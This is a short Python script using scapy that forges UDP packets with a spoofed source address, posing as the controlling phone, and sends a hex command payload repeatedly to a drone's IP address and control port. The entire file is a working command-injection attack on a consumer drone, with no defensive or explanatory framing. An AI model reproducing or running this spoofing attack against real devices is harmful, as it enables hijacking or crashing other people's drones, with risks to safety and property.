from scapy.all import *
from time import sleep

srcIP = '192.168.0.2' # spoofed source IP address - your phone's address
dstIP = '192.168.0.1' # destination IP address - the drone's address
srcPort = 6000 # source port
dstPort = 40000 # destination port

print("Sending spoofed packets")
payload = '\x63\x63\x01\x00\x00\x00\x00'
for i in range(1, 20):
	spoofed_packet = IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
	send(spoofed_packet)
	sleep(1)

print("Packets sent")
